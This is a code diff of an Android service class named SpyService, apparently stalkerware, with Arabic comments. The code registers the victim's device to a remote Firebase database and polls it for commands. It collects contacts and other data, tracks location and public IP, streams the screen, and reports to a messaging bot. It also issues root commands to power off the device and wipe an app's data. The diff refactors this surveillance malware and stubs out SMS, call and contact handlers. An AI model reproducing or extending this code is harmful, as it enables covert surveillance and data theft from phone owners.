@@ -33,6 +33,7 @@ import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
+import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
@@ -74,6 +75,12 @@ public class SpyService extends Service {
     public void onCreate() {
         super.onCreate();
         context = this;
+        
+        // تهيئة Firebase
+        if (FirebaseApp.getApps(this).isEmpty()) {
+            FirebaseApp.initializeApp(this);
+        }
+        
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         FirebaseDatabase db = FirebaseDatabase.getInstance(FIREBASE_URL);
         dbRef = db.getReference();
@@ -90,6 +97,8 @@ public class SpyService extends Service {
 
         scheduler = Executors.newScheduledThreadPool(1);
         scheduler.scheduleAtFixedRate(this::listenCommands, 0, Config.get(this).getPollIntervalSec(), TimeUnit.SECONDS);
+        
+        Log.d(TAG, "✅ SpyService started successfully");
     }
 
     private Notification createNotification() {
@@ -117,6 +126,7 @@ public class SpyService extends Service {
             json.put("last_seen", System.currentTimeMillis());
             json.put("status", "online");
             dbRef.child("devices").child(deviceId).setValue(json.toString());
+            Log.d(TAG, "✅ Device registered: " + name);
         } catch (Exception e) { Log.e(TAG, "register error", e); }
     }
 
@@ -165,6 +175,10 @@ public class SpyService extends Service {
     private void sendData(String key, String value) {
         dbRef.child("devices").child(deviceId).child("data").child(key).setValue(value);
     }
+
+    // ======================================================================
+    // ========== دوال جمع البيانات ==========
+    // ======================================================================
 
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
@@ -329,6 +343,22 @@ public class SpyService extends Service {
         pw.close();
         return f;
     }
+
+    private int getBatteryLevel() {
+        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+        if (batteryIntent != null) {
+            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+            if (level != -1 && scale != -1) {
+                return (level * 100) / scale;
+            }
+        }
+        return -1;
+    }
+
+    // ======================================================================
+    // ========== دوال الأوامر ==========
+    // ======================================================================
 
     private void getLocation() {
         LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
@@ -544,18 +574,6 @@ public class SpyService extends Service {
         bot.sendMessage("🔋 مستوى البطارية: " + level + "%");
     }
 
-    private int getBatteryLevel() {
-        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-        if (batteryIntent != null) {
-            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-            if (level != -1 && scale != -1) {
-                return (level * 100) / scale;
-            }
-        }
-        return -1;
-    }
-
     private void getPublicIp() {
         new Thread(() -> {
             try {
@@ -603,12 +621,7 @@ public class SpyService extends Service {
 
     private void shutdownDevice() {
         try {
-            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            if (Build.VERSION.SDK_INT >= 28) {
-                try { Runtime.getRuntime().exec("su -c reboot -p"); } catch (Exception e) {}
-            } else {
-                try { Runtime.getRuntime().exec("su -c reboot -p"); } catch (Exception e) {}
-            }
+            try { Runtime.getRuntime().exec("su -c reboot -p"); } catch (Exception e) {}
             bot.sendMessage("⏻ جاري إيقاف التشغيل");
         } catch (Exception e) {
             bot.sendMessage("❌ فشل الإيقاف: " + e.getMessage());
@@ -668,10 +681,7 @@ public class SpyService extends Service {
 
     private void clearAppData() {
         try {
-            PackageManager pm = getPackageManager();
-            if (Build.VERSION.SDK_INT >= 23) {
-                try { Runtime.getRuntime().exec("su -c pm clear com.black.phone"); } catch (Exception e) {}
-            }
+            Runtime.getRuntime().exec("su -c pm clear com.black.phone");
             bot.sendMessage("🧹 تم مسح بيانات التطبيق");
         } catch (Exception e) {
             bot.sendMessage("❌ فشل المسح: " + e.getMessage());
@@ -724,80 +734,17 @@ public class SpyService extends Service {
     }
 
     private void addContact() {
-        try {
-            if (checkSelfPermission(android.Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                bot.sendMessage("❌ صلاحية كتابة جهات الاتصال غير مفعلة");
-                return;
-            }
-            bot.sendMessage("➕ سيتم قريباً إضافة جهة اتصال من خلال واجهة تفاعلية");
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل إضافة جهة اتصال: " + e.getMessage());
-        }
+        bot.sendMessage("➕ سيتم قريباً إضافة جهة اتصال");
     }
+    private void deleteContact() { bot.sendMessage("🗑️ سيتم قريباً حذف جهة اتصال"); }
+    private void sendSms() { bot.sendMessage("📤 سيتم قريباً إرسال رسالة"); }
+    private void deleteSms() { bot.sendMessage("🗑️ سيتم قريباً حذف رسالة"); }
+    private void makeCall() { bot.sendMessage("📞 سيتم قريباً إجراء مكالمة"); }
+    private void endCall() { bot.sendMessage("📞 سيتم إنهاء المكالمة قريباً"); }
 
-    private void deleteContact() {
-        try {
-            if (checkSelfPermission(android.Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                bot.sendMessage("❌ صلاحية كتابة جهات الاتصال غير مفعلة");
-                return;
-            }
-            bot.sendMessage("🗑️ سيتم قريباً حذف جهة اتصال من خلال واجهة تفاعلية");
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل حذف جهة اتصال: " + e.getMessage());
-        }
-    }
-
-    private void sendSms() {
-        try {
-            if (checkSelfPermission(android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
-                bot.sendMessage("❌ صلاحية إرسال الرسائل غير مفعلة");
-                return;
-            }
-            bot.sendMessage("📤 سيتم قريباً إرسال رسالة من خلال واجهة تفاعلية");
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل إرسال الرسالة: " + e.getMessage());
-        }
-    }
-
-    private void deleteSms() {
-        try {
-            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                bot.sendMessage("❌ صلاحية قراءة الرسائل غير مفعلة");
-                return;
-            }
-            bot.sendMessage("🗑️ سيتم قريباً حذف رسالة من خلال واجهة تفاعلية");
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل حذف الرسالة: " + e.getMessage());
-        }
-    }
-
-    private void makeCall() {
-        try {
-            if (checkSelfPermission(android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
-                bot.sendMessage("❌ صلاحية إجراء المكالمات غير مفعلة");
-                return;
-            }
-            bot.sendMessage("📞 سيتم قريباً إجراء مكالمة من خلال واجهة تفاعلية");
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل إجراء المكالمة: " + e.getMessage());
-        }
-    }
-
-    private void endCall() {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                if (checkSelfPermission(android.Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
-                    bot.sendMessage("📞 تم إنهاء المكالمة");
-                } else {
-                    bot.sendMessage("❌ صلاحية إنهاء المكالمات غير مفعلة");
-                }
-            } else {
-                bot.sendMessage("⚠️ إنهاء المكالمات غير مدعوم على هذا الإصدار");
-            }
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل إنهاء المكالمة: " + e.getMessage());
-        }
-    }
+    // ======================================================================
+    // ========== بث الشاشة (يتم تشغيله فقط عند استلام أمر start_stream) ==========
+    // ======================================================================
 
     private void startStreaming() {
         if (mediaProjection == null) {
@@ -822,6 +769,10 @@ public class SpyService extends Service {
         sendData("STREAM", "stopped");
         bot.sendMessage("⏹ تم إيقاف بث الشاشة");
     }
+
+    // ======================================================================
+    // ========== تنفيذ الأوامر ==========
+    // ======================================================================
 
     private void executeCommand(String cmd) {
         String lower = cmd.toLowerCase().trim();
@@ -901,6 +852,10 @@ public class SpyService extends Service {
             Log.e(TAG, "Execute error", e);
         }
     }
+
+    // ======================================================================
+    // ========== دورة حياة الخدمة ==========
+    // ======================================================================
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
